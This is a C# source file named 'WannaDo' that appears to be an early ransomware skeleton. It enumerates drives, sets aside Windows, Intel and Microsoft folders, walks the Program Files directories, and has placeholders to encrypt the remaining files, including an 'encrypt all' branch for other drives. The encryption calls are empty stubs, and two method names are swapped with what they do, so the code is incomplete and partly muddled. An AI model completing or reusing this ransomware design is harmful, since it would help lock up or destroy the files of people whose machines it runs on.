using System;
using System.Collections.Generic;
using System.IO;

namespace WannaDo
{
    class Program
    {
        static List<string> DiskLetters = new List<string>();
        static List<Avoid> avoid = new List<Avoid>();
        static List<Target> target = new List<Target>();
        private static void CurrentDrives()
        {
            //get all disk letter in the host
            DriveInfo[] allDrives = DriveInfo.GetDrives();

            foreach (DriveInfo d in allDrives)
            {
                if (d.IsReady == true)
                {
                    Console.WriteLine(d.Name);
                    DiskLetters.Add(d.Name);
                }
                else Console.WriteLine("ready disk not found");
            }
        }
        private static bool Check_Disks(string DiskLetter)
        {
            //check if disk is ready or not
            DriveInfo drive = new DriveInfo(DiskLetter);
            bool isReady = drive.IsReady;
            Console.WriteLine($"disk ready: {isReady.ToString().ToLower()}");
            return isReady;
        }
        private static void AddTarget()
        {
            //add target folders to the list
            avoid.Add(new Avoid { Id = 1, FolderName = "Microsoft" });
            avoid.Add(new Avoid { Id = 1, FolderName = "Intel" });
            avoid.Add(new Avoid { Id = 1, FolderName = "Windows" });
        }
        private static void AddAvoid()
        {
            //add avoid folders to the list
            target.Add(new Target { Id = 1, DirectoryName = @"C:\Program Files\" });
            target.Add(new Target { Id = 2, DirectoryName = @"C:\Program Files (x86)\" });
        }
        private static void EncryptDirs(bool all_foldes)
        {
            Cryptography crypto = new Cryptography();

            //encrypt directory and subdirectory files
            if (all_foldes)
            {
                crypto.EncryptFile("", "");
            }
            else
            {
                crypto.EncryptFile("", "");
            }
        }

        ///// MAIN FUNCTION /////
        static void Main(string[] args)
        {
            CurrentDrives();
            AddAvoid();
            AddTarget();

            foreach (string disk in DiskLetters)
            {
                if (disk.StartsWith('C')) //avoid windows, intel, microsoft folder
                {
                    //get all directories
                    for (int i = 0; i < target.Count; i++)
                    {
                        var dirs = Directory.GetDirectories(target[i].DirectoryName.ToLower());
                        foreach (string dir in dirs)
                        {

                            if (dir.Contains(avoid[0].FolderName) || dir.Contains(avoid[1].FolderName) || dir.Contains(avoid[2].FolderName))
                            {
                                //get avoid dirs
                                Console.WriteLine("avoid dir: " + dir);
                            }
                            else
                            {
                                //get target dirs
                                //get target files into dirs
                            }

                        }
                    }
                }
                else
                {
                    //encrypt all 
                }
            }
        }
    }
}
